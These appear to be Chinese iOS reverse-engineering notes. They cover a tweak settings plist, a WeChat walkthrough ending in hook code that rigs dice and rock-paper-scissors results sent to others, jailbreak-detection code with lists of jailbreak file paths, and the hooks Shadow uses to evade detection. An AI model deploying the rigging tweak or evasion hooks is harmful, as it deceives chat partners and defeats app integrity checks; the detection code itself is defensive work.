<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>items</key>
	<array>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Semester Setting</string>
			<key>footerText</key>
			<string>Make sure your input is in the correct format.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSEditTextCell</string>
			<key>default</key>
			<string></string>
			<key>keyboard</key>
			<string>numbers</string>
			<!-- <key>isNumeric</key>
			<true/> -->
			<key>placeholder</key>
			<string>yyyyMMdd (eg. 20160627)</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>key</key>
			<string>StartDateStr</string>
			<key>label</key>
			<string>Start Date</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Duration</string>
			<key>id</key>
			<string>SliderLabelCell</string>
			<key>footerText</key>
			<string>Total weeks in the semester.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSliderCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>min</key>
			<integer>1</integer>
			<key>max</key>
			<integer>30</integer>
			<key>default</key>
			<integer>18</integer>
			<key>showValue</key>
			<true/>
			<key>isSegmented</key>
			<true/>
			<key>segmentCount</key>
			<integer>29</integer>
			<key>key</key>
			<string>Duration</string>
			<key>label</key>
			<string>Duration</string>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>First Weekday</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSegmentCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>key</key>
			<string>WeekStartDay</string>
			<key>label</key>
			<string>First Weekday</string>
			<key>validValues</key>
			<array>
				<string>Monday</string>
				<string>Sunday</string>
			</array>
			<key>validTitles</key>
			<array>
				<string>Monday</string>
				<string>Sunday</string>
			</array>
			<key>default</key>
			<string>Monday</string>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string>Display Settings</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSwitchCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>label</key>
			<string>Lock Screen</string>
			<key>key</key>
			<string>LockScreenEnabled</string>
			<key>default</key>
			<true/>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSSwitchCell</string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>label</key>
			<string>Notification Center</string>
			<key>key</key>
			<string>NCEnabled</string>
			<key>default</key>
			<true/>
			<key>PostNotification</key>
			<string>com.wangjinli.weekcountpb/prefsChanged</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>label</key>
			<string></string>
			<key>footerText</key>
			<string>Use %W to denote where the week number should be displayed.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSEditTextCell</string>
			<key>default</key>
			<string></string>
			<!-- <key>keyboard</key>
			<string>numbers</string> -->
			<!-- <key>isNumeric</key>
			<true/> -->
			<key>placeholder</key>
			<string></string>
			<key>defaults</key>
			<string>com.wangjinli.weekcountpb</string>
			<key>key</key>
			<string>DisplayFormat</string>
			<key>label</key>
			<string>Display Format</string>
			<key>default</key>
			<string>Week %W</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>footerText</key>
			<string>Respring to apply changes.</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSButtonCell</string>
			<key>label</key>
			<string>Respring</string>
			<key>action</key>
			<string>respring</string>
		</dict>
		<dict>
			<key>cell</key>
			<string>PSGroupCell</string>
			<key>footerText</key>
			<string>© 2016  Li</string>
		</dict>
	</array>
	<key>title</key>
	<string>WeekCount</string>
</dict>
</plist>
```
iPhone注销主屏幕
```
- (void)respring {
    system("killall -9 SpringBoard");
}
```
#### 资料:
https://iphonedevwiki.net/index.php/Preferences_specifier_plist#PSSpecifier_runtime_properties_of_plist_keys
http://iphonedevwiki.net/index.php/Preferences_specifier_plist

### 自定义微信骰子

通过发送表情的 View 找到其 Controller，再在 Controller 中找到发送表情这个操作的响应方法。
然后通过逆向二进制文件得到的反汇编源码，以该方法作为入口，逐层分析调用关系，直到找到关键方法，进而分析该表情的 Model 并完成修改。
准备工作

#### 砸壳、头文件获取
App Store 里 App 的二进制文件被进行了加密，无法直接反汇编分析，也无法通过 class-dump 获取头文件，因此首先需要对其进行解密，通常称之为「砸壳」。
~  class-dump -S -s -H ./WeChat -o ./headers/

#### debugserver 与 LLDB 配置
LLDB 是 Xcode 内置的调试器，debugserver 则是运行在 iOS 上的调试服务端，我们将使用它们对微信进行动态调试分析。
在将设备添加到 Xcode 之后，debugserver 会被自动安装到设备的 /Developer/usr/bin/ 目录下。
但由于缺少 task_for_pid 权限，这里的 debugserver 只能用来调试自己开发的 App，因此需要对其进行处理。
将 debugserver 拷贝到 Mac，首先通过以下命令对其进行「瘦身」。其中 arm64 为64位处理器架构，此参数因设备而异（如对于 iPhone 5 就应是 armv7s）。
~ lipo -thin arm64 ./debugserver -output ./debugserver

然后为其添加 task_for_pid 权限，下载这个 ent.plist 文件对其进行签名。
~ codesign -s - --entitlements ent.plist -f debugserver
完成上述步骤后将 debugserver 拷贝回设备的 /usr/bin/ 目录下，并赋予可执行权限即可。
LLDB 支持 Python 脚本，使用 Python 可以大幅提高调试效率。Chisel 是 Facebook 开源的一个 LLDB Python 命令集，我们将使用它帮助我们的调试。用 Homebrew 安装 Chisel 并将其添加进 LLDB 的初始化脚本中。
```
~ brew install chisel
~ echo command script import /path/to/fblldb.py >> ~/.lldbinit
```

#### 定位入口方法
使用 debugserver 启动微信。
iPhone:~ root# debugserver *:1234 -x backboard /path/to/WeChat.app/WeChat
然后在 Mac 上用 LLDB 连接到 debugserver，并让微信继续运行。
```
~ lldb
(lldb) process connect connect://IOS_IP:1234
Process 51735 stopped
* thread #1: tid = 0xb076f, 0x000000018270d014 libsystem_kernel.dylib`semaphore_wait_trap + 8, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP
    frame #0: 0x000000018270d014 libsystem_kernel.dylib`semaphore_wait_trap + 8
libsystem_kernel.dylib`semaphore_wait_trap:
->  0x18270d014 <+8>: ret

libsystem_kernel.dylib`semaphore_wait_signal_trap:
    0x18270d018 <+0>: movn   x16, #0x24
    0x18270d01c <+4>: svc    #0x80
    0x18270d020 <+8>: ret
(lldb) c
Process 51735 resuming
```

待微信启动完毕之后，先打开微信 Mac 版，借助文件传输助手构建一个收发双端的测试环境（有小号或者有女朋友愿意配合测试的也可）。进入到发送骰子的界面，中断微信，打印出当前的 UI 结构。
```
(lldb) process interrupt
(lldb) po [[UIApp keyWindow] recursiveDescription]
<iConsoleWindow: 0x13df5dd20; baseClass = UIWindow; frame = (0 0; 375 667); autoresize = W+H; gestureRecognizers = <NSArray: 0x13df4e8f0>; layer = <UIWindowLayer: 0x13dde49a0>>
   | <UILayoutContainerView: 0x13f3ba980; frame = (0 0; 375 667); autoresize = W+H; layer = <CALayer: 0x13f3ba880>>
   |    | <UITransitionView: 0x13f3bb560; frame = (0 0; 375 667); clipsToBounds = YES; autoresize = W+H; layer = <CALayer: 0x13dd02a90>>
   ...
    <EmoticonViewWithPreview: 0x13fae98a0; frame = (116 18; 56.5 56.5); layer = <CALayer: 0x13fd2f230>>
打印出的 UI 结构非常复杂，经过一番仔细寻找，发现 EmoticonViewWithPreview 这个 View 的名称比较吻合，且数量是 7 个，和我在这个界面上的表情数相同，初步确定它就是表情显示的 View。因为骰子是第二个表情，所以找到第二个 EmoticonViewWithPreview 的地址 0x13fae98a0，尝试使用 hide 0x13fae98a0 命令，果然发现设备上的骰子消失了，猜想得到了验证。
下面定位它的 Controller，使用 presponder 命令打印其响应链。
(lldb) presponder 0x13fae98a0
<EmoticonViewWithPreview: 0x13fae98a0; frame = (202.5 18; 56.5 56.5); layer = <CALayer: 0x13fb14360>>
   | <EmoticonGridView: 0x13f8e2600; frame = (0 0; 375 187); gestureRecognizers = <NSArray: 0x13fbe45f0>; layer = <CALayer: 0x13fbc4470>>
   |    | <EmoticonBoardPageCollectionEmoticonGridCell: 0x13fd39720; baseClass = UICollectionViewCell; frame = (2250 0; 375 187); layer = <CALayer: 0x13faf4d20>>
   |    |    | <UICollectionView: 0x13e899a00; frame = (0 160; 375 187); gestureRecognizers = <NSArray: 0x13fc2cb40>; layer = <CALayer: 0x13f9f2db0>; contentOffset: {2250, 0}; contentSize: {10875, 187}> collection view layout: <UICollectionViewFlowLayout: 0x13fc29b70>
   |    |    |    | <UIView: 0x13f91c520; frame = (0 -160; 375 347); clipsToBounds = YES; layer = <CALayer: 0x13f909ea0>>
   |    |    |    |    | <EmoticonBoardView: 0x13f4c4130; frame = (0 443; 375 224); layer = <CALayer: 0x13fc035f0>>
   |    |    |    |    |    | <MMInputToolView: 0x13f5b7cf0; frame = (0 0; 375 667); text = ''; layer = <CALayer: 0x13fa6cc40>>
   |    |    |    |    |    |    | <UIView: 0x13f4981b0; frame = (0 0; 375 667); autoresize = W+H; layer = <CALayer: 0x13f90a7c0>>
   |    |    |    |    |    |    |    | <BaseMsgContentViewController: 0x13e42be00>
   |    |    |    |    |    |    |    ...
可以看到 BaseMsgContentViewController 就是它的 Controller，我们打开 BaseMsgContentViewController.h 观察一下，尝试寻找点击骰子之后的响应方法。
这个头文件有多达 600 多行（一个类写成这样真的没问题吗？），使用关键词 emoticon 搜索，容易发现 — (void)SendEmoticonMesssageToolView:(id)arg1; 方法较为可疑，我们来验证一下这个方法的作用。
使用 Hopper Disassembler v3 对「砸壳」过后的微信二进制文件进行反汇编分析，找到该方法。
-[BaseMsgContentViewController SendEmoticonMesssageToolView:]:
00000001018eb1e8    stp     x24, x23, [sp, #0xffffffc0]!
...
00000001018eb2f4    b       imp___stubs__objc_release
                            ; endp
```
下面我们在该方法入口地址处下断点。首先找到微信的 ASLR 偏移地址。
(lldb) im li -o
[  0] 0x000000000005c000
[  1] 0x000000010388c000
...
ASLR 偏移为 0x5c000，方法入口地址为 0x1018eb1e8，因此该命令在内存中的地址应为 0x5c000+0x1018eb1e8=0x1019471e8，我们在该处下断点。
(lldb) br s -a 0x5c000+0x1018eb1e8
Breakpoint 1: where = WeChat`___lldb_unnamed_function82507$$WeChat, address = 0x00000001019471e8
按照同样的方法，在该方法最后一条语句处也下断点。然后让微信恢复运行，点击骰子，入口的断点果然被触发了。
```
Process 51735 stopped
* thread #1: tid = 0xb076f, 0x00000001019471e8 WeChat`___lldb_unnamed_function82507$$WeChat, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x00000001019471e8 WeChat`___lldb_unnamed_function82507$$WeChat
WeChat`___lldb_unnamed_function82507$$WeChat:
->  0x1019471e8 <+0>:  stp    x24, x23, [sp, #-64]!
    0x1019471ec <+4>:  stp    x22, x21, [sp, #16]
    0x1019471f0 <+8>:  stp    x20, x19, [sp, #32]
    0x1019471f4 <+12>: stp    x29, x30, [sp, #48]
(lldb)
```
这时收发双方均未出现骰子。输入 c 让微信继续运行，断点 2 随即被触发。输入 ni 跳出方法，这时可以观察到，接收方已经收到了骰子，而本机尚未出现。这说明产生骰子点数的关键就在这个方法内部，随后只会进行一些本地 UI 的更新。我们成功找到了入口方法，接下来就是顺着调用链继续摸索下去。
探索调用链

在入口方法中，我们将着重关注形如 00000001018eb23c bl imp___stubs__objc_msgSend 方法调用语句。这是因为 Objective-C 中，[SomeObject someMethod] 的底层实现是 objc_msgSend(SomeObject, someMethod)，因此在这些语句处下断点，并打印出参数，就可以得知调用的是哪个类的哪个方法，从而逐层进行寻找。
简单粗暴地在每一个 objc_msgSend 处下断点，观察执行完哪一句之后，接收方收到了骰子即可。于是顺利地定位到了 0x018eb2cc 处的语句，在该语句处查看参数就可以得知是调用的是哪个方法了。在 64 位系统中，函数的参数存放在 X0~XN 寄存器中，所以 X0 应是类/实例，而 X1 应是方法名，它可以被强制转换为字符串。
```
(lldb) po [$x0 class]
WeixinContentLogicController

(lldb) p (char *)$x1
(char *) $115 = 0x00000001026c34ce "SendEmoticonMessage:"
```
可见此处调用的是 [WeixinContentLogicController SendEmoticonMessage:] 方法。直接在 Hopper 中搜不到这个方法，打开 WeixinContentLogicController.h 观察，原来这个方法定义在其基类 BaseMsgContentLogicController 中，这样就可以成功在 Hopper 中找到它。
接下来如法炮制，在 [BaseMsgContentLogicController SendEmoticonMessage:] 中再次找到了一个关键的 objc_msgSend，调用的是 [GameController sendGameMessage:toUsr:] 这个方法。
继续顺藤摸瓜，在 Hopper 中定位到 [GameController sendGameMessage:toUsr:] 方法，大致一扫，马上观察到了嫌疑人的身影：这个方法中调用了 random 随机数函数。
Image for post
看来骰子点数就是在这之后产生的，继续从这一句之后进行分析。依然采用之前的方法层层深入，最终可以摸索出如下的调用链。
Image for post
定位 Model
整理出调用链后，我们直接在调用最后一个上传方法 [CEmoticonUploadMgr StartUpload:] 时下断点，查看它的参数（应在 X2 寄存器）。
(lldb) po [$x2 class]
CMessageWrap
至此我们成功定位了骰子表情的 Model — — 它是一个 CMessageWrap 类的实例，我们在头文件中进行搜索，发现这个类具有多个 category（实际上该类是所有微信消息的 Model，考虑到微信文字、语音、表情等多种多样的消息类型，category 是一个很自然的实现方式）。我们直接打开 CMessageWrap-Emoticon.h 查看。
Image for post
容易发现其中下面两行很有可能与我们的目标有关。
@property(nonatomic) unsigned int m_uiGameContent; // @dynamic m_uiGameContent;
@property(nonatomic) unsigned int m_uiGameType; // @dynamic m_uiGameType;

#### 下面我们编写 Tweak，

hook [CEmoticonUploadMgr StartUpload:] 这个方法，将参数的这两个属性打印出来观察。过程略过，最终经过多次实验，可以得到如下结论。

m_uiGameType 为 1 代表剪刀石头布，2 代表骰子，0 则是普通表情；m_uiGameContent 的值从 1 至 9，依次代表剪刀、石头、布以及骰子的 1 ~ 6 点。
修改结果
首先尝试直接在 [CEmoticonUploadMgr StartUpload:] 中截获传入的参数，根据 m_uiGameType 判断表情类型，然后修改 m_uiGameContent。此时结果是（感谢小伙伴们配合测试）：本机没有效果；接收方若是 iPhone 则可以显示修改后的结果，若是 Android 设备或 Mac 则同样无效果，且结果与本机显示的相同。
这说明两点问题：第一，随机数产生后，在之前得出的调用链中传递给了其他没有分析到的方法，造成本机不生效；第二，最终上传的 CMessageWrap 中除了 m_uiGameContent 属性外，仍有其他属性记录了骰子的真实值。
为验证第二点，我们打印出 [CEmoticonUploadMgr StartUpload:] 的参数的所有信息进行查看。
```
(lldb) pinternals $x2
(CMessageWrap) $129 = {
  MMObject = {
    NSObject = {
      isa = CMessageWrap
    }
  }
  m_bIsSplit = false
  m_bNew = true
  m_uiMesLocalID = 328
  m_n64MesSvrID = 0
  m_nsFromUsr = 0xa0a0d02812812039
  m_nsToUsr = 0xa0221102a012405a
  m_uiMessageType = 47
  m_nsContent = 0x000000013f489e40 @"<msg><emoji md5=\"5ba8e9694b853df10b9f2a77b312cc09\" type=\"1\" len = \"8636\" productid=\"custom_emoticon_pid\"></emoji><gameext type=\"2\" content=\"9\" ></gameext></msg>"
  m_uiStatus = 1
  ...
  
  ```
可以发现 m_nsContent 属性的值是一个 xml 格式的字符串，其中 <gameext type=\”2\” content=\”9\” ></gameext> 就是骰子的信息。也就是说，修改过后 m_nsContent 和 m_uiGameContent 两个属性中的信息出现了矛盾，而微信不同平台的客户端也许在此处的接收逻辑有所差异，导致了上述结果。
要解决这个问题，本质上与解决第一点是等价的，无非是往调用链的上游寻找遗漏点。过程与之前类似，
最终找到了 [GameController getMD5ByGameContent:] 这个方法（红色方框）与结果有关，其参数就是 m_uiGameContent 的值。
```
#import "headers/CEmoticonWrap.h"
#import "headers/CMessageWrap.h"
#import "headers/WCDUserDefaultsMgr.h"
#import <UIKit/UIKit.h>

CMessageWrap *setDice(CMessageWrap *wrap, unsigned int point) {
	if (wrap.m_uiGameType == 2) {
		wrap.m_uiGameContent = point + 3;
	}
	return wrap;
}

CMessageWrap *setJsb(CMessageWrap *wrap, unsigned int type) {
	if (wrap.m_uiGameType == 1) {
		wrap.m_uiGameContent = type;
	}
	return wrap;
}

WCDUserDefaultsMgr *prefs = nil;

%hook GameController

+ (id)getMD5ByGameContent:(unsigned int)arg1 {
	prefs = [WCDUserDefaultsMgr sharedUserDefaults];
	if (arg1 > 3 && arg1 < 10) {
		if (prefs.diceEnabled) {
			return %orig(prefs.dicePoint + 3);
		} else {
			return %orig;
		}
	} else if (arg1 > 0 && arg1 < 4) {
		if (prefs.jsbEnabled) {
			return %orig(prefs.jsbType);
		} else {
			return %orig;
		}
	} else {
		return %orig;
	}
}

%end

%hook CMessageMgr

- (void)AddEmoticonMsg:(id)arg1 MsgWrap:(id)arg2 {
	CMessageWrap *wrap = (CMessageWrap *)arg2;
	if (prefs == nil) { prefs = [WCDUserDefaultsMgr sharedUserDefaults]; }
	if (wrap.m_uiGameType == 2) {
		if (prefs.diceEnabled) {
			%orig(arg1, setDice(arg2, prefs.dicePoint));
		} else {
			%orig;
		}
	} else if (wrap.m_uiGameType == 1) {
		if (prefs.jsbEnabled) {
			%orig(arg1, setJsb(arg2, prefs.jsbType));
		} else {
			%orig;
		}
	} else {
		%orig;
	}
}

%end

%hook CEmoticonUploadMgr

- (void)StartUpload:(id)arg1 {
	CMessageWrap *wrap = (CMessageWrap *)arg1;
	if (prefs == nil) { prefs = [WCDUserDefaultsMgr sharedUserDefaults]; }
	if (wrap.m_uiGameType == 2) {
		if (prefs.diceEnabled) {
			%orig(setDice(arg1, prefs.dicePoint));
		} else {
			%orig;
		}
	} else if (wrap.m_uiGameType == 1) {
		if (prefs.jsbEnabled) {
			%orig(setJsb(arg1, prefs.jsbType));
		} else {
			%orig;
		}
	} else {
		%orig;
	}
}

%end

```
#### hook如上3个方法，就可以成功地控制骰子/剪刀石头布游戏的结果

## DYLD_INSERT_LIBRARIES
dylib本质上是一个Mach-O格式的文件，它与普通的Mach-O执行文件几乎使用一样的结构，只是在文件类型上一个是MH_DYLIB，一个是MH_EXECUTE。
在系统的/usr/lib目录下，存放了大量供系统与应用程序调用的动态库文件

循环遍历DYLD_INSERT_LIBRARIES环境变量中指定的动态库列表，并调用loadInsertedDylib()将其(插件dylib)加载。该函数调用load()完成加载工作。

```
#ifndef SUBSTRATE_ENVIRONMENT_HPP
#define SUBSTRATE_ENVIRONMENT_HPP

#define SubstrateVariable_ "DYLD_INSERT_LIBRARIES"
#define SubstrateLibrary_ "/Library/MobileSubstrate/MobileSubstrate.dylib"

#define SubstrateSafeMode_ "_MSSafeMode"

void MSClearEnvironment();

#endif//SUBSTRATE_ENVIRONMENT_HPP
```

## 检测是否越狱
```
#import "UserCust.h"
#import <UIKit/UIKit.h>
#import <sys/stat.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <TargetConditionals.h>
#import <objc/runtime.h>
#import <objc/message.h>
#include <stdio.h>
#import <dlfcn.h>
#import <sys/types.h>

static char *JbPaths[] = {"/Applications/Cydia.app",
    "/usr/sbin/sshd",
    "/bin/bash",
    "/etc/apt",
    "/Library/MobileSubstrate",
    "/User/Applications/"};

static NSSet *sDylibSet ; // 需要检测的动态库
static BOOL SCHECK_USER = NO; /// 检测是否越狱

@implementation UserCust


+ (void)load {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    sDylibSet  = [NSSet setWithObjects:
                       @"/usr/lib/CepheiUI.framework/CepheiUI",
                       @"/usr/lib/libsubstitute.dylib",
                       @"/usr/lib/substitute-inserter.dylib",
                       @"/usr/lib/substitute-loader.dylib",
                       @"/usr/lib/substrate/SubstrateLoader.dylib",
                       @"/usr/lib/substrate/SubstrateInserter.dylib",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/Library/MobileSubstrate/DynamicLibraries/0Shadow.dylib",
                  
                  nil];
    _dyld_register_func_for_add_image(_check_image);
  });
}

+ (instancetype)sharedInstance {
    
    static id sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [self new];
    });
    return sharedInstance;
}

// 监听image加载，从这里判断动态库是否加载，因为其他的检测动态库的方案会被hook
static void _check_image(const struct mach_header *header,
                                      intptr_t slide) {
  // hook Image load
  if (SCHECK_USER) {
    // 检测后就不在检测
    return;
  }

  // 检测的lib
  Dl_info info;
  // 0表示加载失败了，这里大概率是被hook导致的
  if (dladdr(header, &info) == 0) {
    char *dlerro = dlerror();
    // 获取失败了 但是返回了dli_fname, 说明被人hook了，目前看的方案都是直接返回0来绕过的
    if(dlerro == NULL && info.dli_fname != NULL) {
      NSString *libName = [NSString stringWithUTF8String:info.dli_fname];
      // 判断有没有在动态列表里面
      if ([sDylibSet containsObject:libName]) {
        SCHECK_USER = YES;
      }
    }
    return;
  }
}


// 越狱检测
- (BOOL)UVItinitse {
  
    if (SCHECK_USER) {
      return YES;
    }

    if (isStatNotSystemLib()) {
        return YES;
    }

    if (isDebugged()) {
        return YES;
    }

    if (isInjectedWithDynamicLibrary()) {
        return YES;
    }

    if (JCheckKuyt()) {
        return YES;
    }

    if (dyldEnvironmentVariables()) {
        return YES;
    }

    return NO;
}

CFRunLoopSourceRef gSocketSource;
BOOL fileExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = NO;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL directoryExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = YES;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL canOpen(NSString* path)
{
    FILE *file = fopen([path UTF8String], "r");
    if(file==nil){
        return fileExist(path) || directoryExist(path);
    }
    fclose(file);
    return YES;
}

#pragma mark 使用NSFileManager通过检测一些越狱后的关键文件是否可以访问来判断是否越狱
// 检测越狱
BOOL JCheckKuyt()
{
    
    if(TARGET_IPHONE_SIMULATOR)return NO;

    //Check cydia URL hook canOpenURL 来绕过
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.avl.com"]])
    {
        return YES;
    }

    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]])
    {
        return YES;
    }

    NSArray* checks = [[NSArray alloc] initWithObjects:@"/Application/Cydia.app",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/bin/bash",
                       @"/usr/sbin/sshd",
                       @"/etc/apt",
                       @"/usr/bin/ssh",
                       @"/private/var/lib/apt",
                       @"/private/var/lib/cydia",
                       @"/private/var/tmp/cydia.log",
                       @"/Applications/WinterBoard.app",
                       @"/var/lib/cydia",
                       @"/private/etc/dpkg/origins/debian",
                       @"/bin.sh",
                       @"/private/etc/apt",
                       @"/etc/ssh/sshd_config",
                       @"/private/etc/ssh/sshd_config",
                       @"/Applications/SBSetttings.app",
                       @"/private/var/mobileLibrary/SBSettingsThemes/",
                       @"/private/var/stash",
                       @"/usr/libexec/sftp-server",
                       @"/usr/libexec/cydia/",
                       @"/usr/sbin/frida-server",
                       @"/usr/bin/cycript",
                       @"/usr/local/bin/cycript",
                       @"/usr/lib/libcycript.dylib",
                       @"/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
                       @"/System/Library/LaunchDaemons/com.ikey.bbot.plist",
                       @"/Applications/FakeCarrier.app",
                       @"/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
                       @"/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
                       @"/usr/libexec/ssh-keysign",
                       @"/usr/libexec/sftp-server",
                       @"/Applications/blackra1n.app",
                       @"/Applications/IntelliScreen.app",
                       @"/Applications/Snoop-itConfig.app"
                       @"/var/lib/dpkg/info", nil];
    //Check installed app
    for(NSString* check in checks)
    {
        if(canOpen(check))
        {
            return YES;
        }
    }
    //symlink verification
    struct stat sym;
    // hook lstat可以绕过
    if(lstat("/Applications", &sym) || lstat("/var/stash/Library/Ringtones", &sym) ||
       lstat("/var/stash/Library/Wallpaper", &sym) ||
       lstat("/var/stash/usr/include", &sym) ||
       lstat("/var/stash/usr/libexec", &sym)  ||
       lstat("/var/stash/usr/share", &sym) ||
       lstat("/var/stash/usr/arm-apple-darwin9", &sym))
    {
        if(sym.st_mode & S_IFLNK)
        {
            return YES;
        }
    }
  

    //Check process forking
    // hook fork
    int pid = fork();
    if(!pid)
    {
        exit(1);
    }
    if(pid >= 0)
    {
        return YES;
    }

  
//     check has class only used in breakJail like HBPreferences. 越狱常用的类，这里无法绕过，只要多找一些特征类就可以，注意，很多反越狱插件会混淆，所以可能要通过查关键方法来识别
    NSArray *checksClass = [[NSArray alloc] initWithObjects:@"HBPreferences",nil];
    for(NSString *className in checksClass)
    {
      if (NSClassFromString(className) != NULL) {
        return YES;
      }
    }
  
//    Check permission to write to /private hook FileManager 和 writeToFile来绕过
    NSString *path = @"/private/avl.txt";
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSError* error;
        NSString *test = @"AVL was here";
        [test writeToFile:path atomically:NO encoding:NSStringEncodingConversionAllowLossy error:&error];
        [fileManager removeItemAtPath:path error:nil];
        if(error==nil)
        {
            return YES;
        }

        return NO;
    } @catch (NSException *exception) {
        return NO;
    }
}

BOOL isInjectedWithDynamicLibrary()
{
  unsigned int outCount = 0;
  const char **images =  objc_copyImageNames(&outCount);
  for (int i = 0; i < outCount; i++) {
      printf("%s\n", images[i]);
  }
  
  
  int i=0;
    while(true){
        // hook _dyld_get_image_name方法可以绕过
        const char *name = _dyld_get_image_name(i++);
        if(name==NULL){
            break;
        }
        if (name != NULL) {
          NSString *libName = [NSString stringWithUTF8String:name];
          if ([sDylibSet containsObject:libName]) {
            return YES;
          }

        }
    }
    return NO;
}

#pragma mark 通过环境变量DYLD_INSERT_LIBRARIES检测是否越狱
BOOL dyldEnvironmentVariables ()
{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !(NULL == getenv("DYLD_INSERT_LIBRARIES"));
}

#pragma mark 校验当前进程是否为调试模式，hook sysctl方法可以绕过
// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
// Thanks to https://developer.apple.com/library/archive/qa/qa1361/_index.html
BOOL isDebugged()
{
    int junk;
    int mib[4];
    struct kinfo_proc info;
    size_t size;
    info.kp_proc.p_flag = 0;
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);
    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

#pragma mark 使用stat通过检测一些越狱后的关键文件是否可以访问来判断是否越狱，hook stat 方法和dladdr可以绕过
BOOL isStatNotSystemLib() {
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int ret ;
    Dl_info dylib_info;
    int (*func_stat)(const char *, struct stat *) = stat;
    if ((ret = dladdr(func_stat, &dylib_info))) {
        NSString *fName = [NSString stringWithUTF8String: dylib_info.dli_fname];
        if(![fName isEqualToString:@"/usr/lib/system/libsystem_kernel.dylib"]){
            return YES;
        }
    }
    
    for (int i = 0;i < sizeof(JbPaths) / sizeof(char *);i++) {
        struct stat stat_info;
        if (0 == stat(JbPaths[i], &stat_info)) {
            return YES;
        }
    }
    
    return NO;
}

typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);

#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif

// 禁止gdb调试
- (void) disable_gdb {
    if(TARGET_IPHONE_SIMULATOR)return;
    void* handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW);
    ptrace_ptr_t ptrace_ptr = dlsym(handle, "ptrace");
    ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0);
    dlclose(handle);
}

@end

```

## 越狱注入的原理
1.利用Cydia Substrate会将 SpringBoard 的 [FBApplicationInfo environmentVariables] hook ，

2. 将环境变量DYLD_INSERT_LIBRARIES设定新增需要载入的动态库，但是应用的二进制包无需做任何变化，

3. dyld会在载入应用的时候因为DYLD_INSERT_LIBRARIES去插入具体的库。 

屏蔽越狱检测插件shadow主要逻辑为：

shadow会维护一个列表，检索哪些文件是越狱需要保护的文件

hook相关的类，如果要检索这些文件，就影藏，返回修改后的结果。
```
hook c的类,主要是各种判断文件权限和执行命令的方法,比如：
access
getenv
fopen
freopen
stat
dlopen
hook_NSFileManager | NSFileHandle |  NSDirectoryEnumerator | hook_NSFileVersion | NSBundle
hook_NSURL
hook_UIApplication
hook_NSBundle
hook_CoreFoundation
hook UIImage
hook NSMutableArray | NSArray | NSMutableDictionary | NSDictionary | NSString
hook 第三方库检测方法
hook hook_debugging
sysctl 主要用来检测是否当前进程挂载了P_TRACED
getppid 返回当前的pid
_ptrace
hook_dyld_image 。hook image动态加载的方法
_dyld_image_count 获取image的数量
_dyld_get_image_name 获取动态库的名字
hook_dyld_dlsym。hook 用来检测是否可以加载动态库。功能和dlopen一样
hook系统一些私有方法：vfork | fork | hook_popen（打开管道）
hook runtime
hook_dladdr dladdr可以用来获取方法或image对应的信息，比如所属的动态库的名称，这里hook如果是忽略的文件，则返回0，所以如果返回0，要再判断下是否数据真的是空的。
```
